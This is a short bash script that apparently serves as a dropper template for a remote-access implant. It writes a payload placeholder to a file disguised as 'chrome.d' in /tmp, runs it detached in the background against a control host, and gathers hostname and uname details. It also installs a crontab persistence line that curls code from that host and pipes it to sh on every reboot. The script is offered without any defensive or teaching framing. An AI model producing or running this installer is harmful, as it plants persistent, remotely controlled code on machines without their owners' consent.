#!/bin/bash

FILENAME=chrome.d
HOST=localhost:5000

HOSTNAME=`hostname`
UNAME=`uname -a`

mkdir -p /tmp/lolz && cd /tmp/lolz


cat>$FILENAME<<EOF
{python}
EOF

chmod +x $FILENAME

if which screen &> /dev/null; then
    # screen found
    screen -d ./$FILENAME $HOST
else
    # lol no screen
    nohup ./$FILENAME $HOST &
fi


if which crontab &> /dev/null; then
    echo "@reboot curl https://$HOST/client | sh" | crontab
fi
